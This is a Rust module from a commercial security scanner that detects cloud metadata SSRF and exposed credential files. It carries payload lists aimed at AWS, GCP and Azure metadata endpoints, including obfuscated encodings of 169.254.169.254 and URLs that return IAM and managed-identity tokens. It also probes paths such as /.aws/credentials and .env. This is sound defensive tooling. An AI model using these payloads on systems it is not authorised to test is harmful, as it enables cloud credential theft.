// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Cloud Security Scanner
 * Tests for cloud metadata service abuse and misconfigurations
 *
 * Detects:
 * - AWS metadata service abuse (169.254.169.254)
 * - GCP metadata API exposure
 * - Azure Instance Metadata Service (IMDS) attacks
 * - Cloud credential exposure
 * - IAM role enumeration
 * - Security token leakage
 * - Cloud storage bucket misconfigurations
 * - Container registry exposure
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use regex::Regex;
use std::sync::Arc;
use tracing::{debug, info};

pub struct CloudSecurityScanner {
    http_client: Arc<HttpClient>,
}

impl CloudSecurityScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan endpoint for cloud security vulnerabilities
    /// NOTE: This method does NOT spray-and-pray with hardcoded param lists.
    /// Only test parameters discovered from actual forms/URLs via scan_parameter().
    pub async fn scan(
        &self,
        _url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        // Only test parameters discovered from actual forms/URLs - no spray-and-pray
        // The main scanner will call scan_parameter() with discovered URL-like params
        Ok((Vec::new(), 0))
    }

    /// Scan a specific parameter for cloud metadata SSRF
    pub async fn scan_parameter(
        &self,
        url: &str,
        param_name: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Only test URL-like parameters
        let url_params = ["url", "uri", "path", "redirect", "target", "dest", "link", "site", "file", "page", "src", "href", "callback", "return", "next"];
        let param_lower = param_name.to_lowercase();
        if !url_params.iter().any(|p| param_lower.contains(p)) {
            return Ok((Vec::new(), 0));
        }

        info!("[Cloud] Testing cloud metadata SSRF on parameter: {}", param_name);

        // Test AWS metadata
        let (vulns, tests) = self.test_metadata_ssrf_on_param(url, param_name, "aws").await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_metadata_ssrf_on_param(url, param_name, "gcp").await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_metadata_ssrf_on_param(url, param_name, "azure").await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test cloud metadata SSRF on a specific parameter
    async fn test_metadata_ssrf_on_param(
        &self,
        url: &str,
        param_name: &str,
        cloud: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let payloads: Vec<&str> = match cloud {
            "aws" => vec![
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ],
            "gcp" => vec![
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            ],
            "azure" => vec![
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            ],
            _ => vec![],
        };

        for payload in payloads {
            tests_run += 1;
            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param_name, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", url, param_name, urlencoding::encode(payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    let detected = match cloud {
                        "aws" => self.detect_aws_metadata(&response.body),
                        "gcp" => self.detect_gcp_metadata(&response.body),
                        "azure" => self.detect_azure_metadata(&response.body),
                        _ => false,
                    };
                    if detected {
                        let cloud_upper = cloud.to_uppercase();
                        info!("{} metadata SSRF detected via parameter: {}", cloud_upper, param_name);
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            &format!("{} Metadata Service SSRF", cloud_upper),
                            &format!("{}={}", param_name, payload),
                            &format!("SSRF vulnerability allows access to {} metadata service via '{}' parameter", cloud_upper, param_name),
                            &format!("{} instance metadata exposed - credentials may be compromised", cloud_upper),
                            Severity::Critical,
                            "CWE-918",
                            9.8,
                        ));
                        return Ok((vulnerabilities, tests_run));
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// DEPRECATED: Old spray-and-pray methods below (kept for reference)

    /// Test AWS metadata service SSRF
    async fn test_aws_metadata_ssrf(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 15;

        debug!("Testing AWS metadata service SSRF");

        let aws_metadata_payloads = vec![
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
            "http://0251.0376.0251.0376/latest/meta-data/",
            "http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
        ];

        let test_params = vec!["url".to_string(), "uri".to_string(), "path".to_string(), "redirect".to_string(), "target".to_string(), "dest".to_string(), "link".to_string(), "site".to_string()];

        for param in test_params {
            for metadata_url in &aws_metadata_payloads {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(metadata_url))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(metadata_url))
                };

                match self.http_client.get(&test_url).await {
                    Ok(response) => {
                        if self.detect_aws_metadata(&response.body) {
                            info!("AWS metadata SSRF detected via parameter: {}", param);
                            vulnerabilities.push(self.create_vulnerability(
                                url,
                                "AWS Metadata Service SSRF",
                                &format!("{}={}", param, metadata_url),
                                &format!("SSRF vulnerability allows access to AWS EC2 metadata service via '{}' parameter", param),
                                "AWS instance metadata exposed - IAM credentials may be compromised",
                                Severity::Critical,
                                "CWE-918",
                                9.8,
                            ));
                            return Ok((vulnerabilities, tests_run));
                        }
                    }
                    Err(e) => {
                        debug!("Request failed: {}", e);
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test GCP metadata service SSRF
    async fn test_gcp_metadata_ssrf(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 10;

        debug!("Testing GCP metadata service SSRF");

        let gcp_metadata_payloads = vec![
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://metadata/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",
        ];

        let test_params = vec!["url".to_string(), "uri".to_string(), "path".to_string(), "redirect".to_string(), "target".to_string()];

        for param in test_params {
            for metadata_url in &gcp_metadata_payloads {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(metadata_url))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(metadata_url))
                };

                let headers = vec![
                    ("Metadata-Flavor".to_string(), "Google".to_string()),
                ];

                match self.http_client.get_with_headers(&test_url, headers).await {
                    Ok(response) => {
                        if self.detect_gcp_metadata(&response.body) {
                            info!("GCP metadata SSRF detected via parameter: {}", param);
                            vulnerabilities.push(self.create_vulnerability(
                                url,
                                "GCP Metadata Service SSRF",
                                &format!("{}={}", param, metadata_url),
                                &format!("SSRF vulnerability allows access to GCP metadata service via '{}' parameter", param),
                                "GCP instance metadata exposed - service account tokens may be compromised",
                                Severity::Critical,
                                "CWE-918",
                                9.8,
                            ));
                            return Ok((vulnerabilities, tests_run));
                        }
                    }
                    Err(e) => {
                        debug!("Request failed: {}", e);
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Azure IMDS SSRF
    async fn test_azure_imds_ssrf(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 10;

        debug!("Testing Azure IMDS SSRF");

        let azure_metadata_payloads = vec![
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity?api-version=2018-02-01",
        ];

        let test_params = vec!["url".to_string(), "uri".to_string(), "path".to_string(), "redirect".to_string(), "target".to_string()];

        for param in test_params {
            for metadata_url in &azure_metadata_payloads {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(metadata_url))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(metadata_url))
                };

                let headers = vec![
                    ("Metadata".to_string(), "true".to_string()),
                ];

                match self.http_client.get_with_headers(&test_url, headers).await {
                    Ok(response) => {
                        if self.detect_azure_metadata(&response.body) {
                            info!("Azure IMDS SSRF detected via parameter: {}", param);
                            vulnerabilities.push(self.create_vulnerability(
                                url,
                                "Azure IMDS SSRF",
                                &format!("{}={}", param, metadata_url),
                                &format!("SSRF vulnerability allows access to Azure IMDS via '{}' parameter", param),
                                "Azure instance metadata exposed - managed identity tokens may be compromised",
                                Severity::Critical,
                                "CWE-918",
                                9.8,
                            ));
                            return Ok((vulnerabilities, tests_run));
                        }
                    }
                    Err(e) => {
                        debug!("Request failed: {}", e);
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test for cloud credential exposure
    async fn test_cloud_credential_exposure(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 15;

        debug!("Testing for cloud credential exposure");

        let credential_endpoints = vec![
            "/.aws/credentials",
            "/.aws/config",
            "/.azure/credentials",
            "/.gcp/credentials.json",
            "/credentials.json",
            "/service-account.json",
            "/.env",
            "/config.json",
            "/aws-exports.js",
            "/credentials",
            "/.git/config",
            "/terraform.tfstate",
            "/terraform.tfvars",
            "/.terraform/terraform.tfstate",
            "/ansible/inventory",
        ];

        for endpoint in credential_endpoints {
            let test_url = self.build_url(url, endpoint);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.status_code == 200 {
                        if let Some(cred_type) = self.detect_cloud_credentials(&response.body) {
                            info!("Cloud credentials exposed at {}: {}", endpoint, cred_type);
                            vulnerabilities.push(self.create_vulnerability(
                                url,
                                "Cloud Credentials Exposure",
                                "",
                                &format!("{} exposed at {}", cred_type, endpoint),
                                &format!("Sensitive {} found in publicly accessible file", cred_type),
                                Severity::Critical,
                                "CWE-798",
                                9.8,
                            ));
                            break;
                        }
                    }
                }
                Err(e) => {
                    debug!("Request to {} failed: {}", endpoint, e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    fn detect_aws_metadata(&self, body: &str) -> bool {
        let aws_indicators = vec![
            "ami-id",
            "instance-id",
            "instance-type",
            "iam/security-credentials",
            "AccessKeyId",
            "SecretAccessKey",
            "Token",
            "public-ipv4",
            "local-ipv4",
            "placement/availability-zone",
        ];

        let body_lower = body.to_lowercase();
        let mut matches = 0;

        for indicator in aws_indicators {
            if body_lower.contains(&indicator.to_lowercase()) {
                matches += 1;
                if matches >= 2 {
                    return true;
                }
            }
        }

        false
    }

    fn detect_gcp_metadata(&self, body: &str) -> bool {
        let gcp_indicators = vec![
            "access_token",
            "token_type",
            "expires_in",
            "serviceAccounts",
            "computeMetadata",
            "instance/",
            "project/",
        ];

        let body_lower = body.to_lowercase();
        for indicator in gcp_indicators {
            if body_lower.contains(&indicator.to_lowercase()) {
                return true;
            }
        }

        false
    }

    fn detect_azure_metadata(&self, body: &str) -> bool {
        let azure_indicators = vec![
            "vmId",
            "subscriptionId",
            "resourceGroupName",
            "access_token",
            "client_id",
            "resource",
            "compute",
            "network",
            "osProfile",
        ];

        let body_lower = body.to_lowercase();
        let mut matches = 0;

        for indicator in azure_indicators {
            if body_lower.contains(&indicator.to_lowercase()) {
                matches += 1;
                if matches >= 2 {
                    return true;
                }
            }
        }

        false
    }

    fn detect_cloud_credentials(&self, body: &str) -> Option<String> {
        let patterns = vec![
            (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
            (r"aws_access_key_id\s*=", "AWS Credentials"),
            (r"aws_secret_access_key\s*=", "AWS Secret Key"),
            (r#""type"\s*:\s*"service_account""#, "GCP Service Account"),
            (r#""private_key"\s*:\s*"-----BEGIN PRIVATE KEY-----"#, "GCP Private Key"),
            (r"azure_client_id", "Azure Client ID"),
            (r"azure_client_secret", "Azure Client Secret"),
            (r"azure_tenant_id", "Azure Tenant ID"),
            (r"AZURE_STORAGE_CONNECTION_STRING", "Azure Storage Connection"),
            (r"DefaultEndpointsProtocol=https;AccountName=", "Azure Storage Account"),
        ];

        for (pattern, cred_type) in patterns {
            if let Ok(re) = Regex::new(pattern) {
                if re.is_match(body) {
                    return Some(cred_type.to_string());
                }
            }
        }

        None
    }

    fn build_url(&self, base: &str, path: &str) -> String {
        if let Ok(parsed) = url::Url::parse(base) {
            let base_url = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));
            if base_url.ends_with('/') && path.starts_with('/') {
                format!("{}{}", base_url.trim_end_matches('/'), path)
            } else if !base_url.ends_with('/') && !path.starts_with('/') {
                format!("{}/{}", base_url, path)
            } else {
                format!("{}{}", base_url, path)
            }
        } else {
            format!("{}{}", base, path)
        }
    }

    fn create_vulnerability(
        &self,
        url: &str,
        vuln_type: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
        cwe: &str,
        cvss: f64,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("cloud_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: vuln_type.to_string(),
            severity,
            confidence: Confidence::High,
            category: "Cloud Security".to_string(),
            url: url.to_string(),
            parameter: None,
            payload: payload.to_string(),
            description: description.to_string(),
            evidence: Some(evidence.to_string()),
            cwe: cwe.to_string(),
            cvss: cvss as f32,
            verified: true,
            false_positive: false,
            remediation: self.get_remediation(vuln_type),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }

    fn get_remediation(&self, vuln_type: &str) -> String {
        match vuln_type {
            "AWS Metadata Service SSRF" => {
                "1. Implement strict input validation for all URL parameters\n\
                 2. Use allowlist for permitted domains/IPs\n\
                 3. Block access to 169.254.169.254 at network/firewall level\n\
                 4. Use IMDSv2 which requires session tokens\n\
                 5. Implement egress filtering to block metadata service\n\
                 6. Use AWS VPC endpoints for service access\n\
                 7. Apply principle of least privilege to IAM roles\n\
                 8. Monitor CloudTrail for unusual metadata access patterns\n\
                 9. Use AWS Systems Manager Session Manager instead of SSH\n\
                 10. Implement network segmentation and security groups".to_string()
            }
            "GCP Metadata Service SSRF" => {
                "1. Validate and sanitize all URL inputs\n\
                 2. Block access to metadata.google.internal and 169.254.169.254\n\
                 3. Require 'Metadata-Flavor: Google' header validation\n\
                 4. Use service account impersonation with short-lived tokens\n\
                 5. Implement VPC Service Controls\n\
                 6. Use Workload Identity for GKE applications\n\
                 7. Apply least privilege to service account permissions\n\
                 8. Monitor Cloud Audit Logs for metadata access\n\
                 9. Use Cloud Armor for application layer protection\n\
                 10. Implement egress firewall rules".to_string()
            }
            "Azure IMDS SSRF" => {
                "1. Validate all URL parameters against allowlist\n\
                 2. Block access to 169.254.169.254 at NSG/firewall level\n\
                 3. Require 'Metadata: true' header for IMDS access\n\
                 4. Use Azure Managed Identities with minimal permissions\n\
                 5. Implement Azure Firewall for egress filtering\n\
                 6. Use Azure Key Vault for secrets instead of IMDS\n\
                 7. Enable diagnostic logging for unusual access patterns\n\
                 8. Use Azure Policy to enforce security configurations\n\
                 9. Implement network isolation with Private Endpoints\n\
                 10. Regular rotation of managed identity credentials".to_string()
            }
            "Cloud Credentials Exposure" => {
                "1. Never commit credentials to version control\n\
                 2. Use secrets management services (AWS Secrets Manager, Azure Key Vault, GCP Secret Manager)\n\
                 3. Implement .gitignore for credential files\n\
                 4. Use environment variables for credentials\n\
                 5. Rotate all exposed credentials immediately\n\
                 6. Enable credential scanning in CI/CD pipelines\n\
                 7. Use short-lived credentials when possible\n\
                 8. Implement least privilege access controls\n\
                 9. Monitor access logs for unusual patterns\n\
                 10. Use managed identities instead of static credentials\n\
                 11. Regular security audits of exposed endpoints\n\
                 12. Implement web application firewall rules".to_string()
            }
            _ => "Follow cloud security best practices and implement defense in depth".to_string(),
        }
    }
}

mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Uuid
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}{:04x}{:04x}{:04x}{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> CloudSecurityScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        CloudSecurityScanner::new(http_client)
    }

    #[test]
    fn test_detect_aws_metadata() {
        let scanner = create_test_scanner();

        let aws_response = r#"{"ami-id":"ami-12345","instance-id":"i-abcdef"}"#;
        assert!(scanner.detect_aws_metadata(aws_response));

        let aws_creds = r#"{"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}"#;
        assert!(scanner.detect_aws_metadata(aws_creds));
    }

    #[test]
    fn test_detect_gcp_metadata() {
        let scanner = create_test_scanner();

        let gcp_response = r#"{"access_token":"ya29.","token_type":"Bearer","expires_in":3600}"#;
        assert!(scanner.detect_gcp_metadata(gcp_response));

        let gcp_sa = r#"{"serviceAccounts":"default"}"#;
        assert!(scanner.detect_gcp_metadata(gcp_sa));
    }

    #[test]
    fn test_detect_azure_metadata() {
        let scanner = create_test_scanner();

        let azure_response = r#"{"vmId":"abc-123","subscriptionId":"sub-456","resourceGroupName":"rg-test"}"#;
        assert!(scanner.detect_azure_metadata(azure_response));

        let azure_compute = r#"{"compute":{"osProfile":{}}}"#;
        assert!(scanner.detect_azure_metadata(azure_compute));
    }

    #[test]
    fn test_detect_cloud_credentials() {
        let scanner = create_test_scanner();

        let aws_creds = "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = secret";
        assert!(scanner.detect_cloud_credentials(aws_creds).is_some());

        let gcp_sa = r#"{"type": "service_account", "private_key": "-----BEGIN PRIVATE KEY-----\n..."}"#;
        assert!(scanner.detect_cloud_credentials(gcp_sa).is_some());

        let azure_creds = "azure_client_id=abc123";
        assert!(scanner.detect_cloud_credentials(azure_creds).is_some());
    }

    #[test]
    fn test_no_false_positives() {
        let scanner = create_test_scanner();

        assert!(!scanner.detect_aws_metadata("Normal web page content"));
        assert!(!scanner.detect_gcp_metadata("Regular JSON response"));
        assert!(!scanner.detect_azure_metadata("Plain text content"));
        assert!(scanner.detect_cloud_credentials("No credentials here").is_none());
    }

    #[test]
    fn test_build_url() {
        let scanner = create_test_scanner();

        assert_eq!(
            scanner.build_url("https://example.com/path", "/.aws/credentials"),
            "https://example.com/.aws/credentials"
        );
    }
}
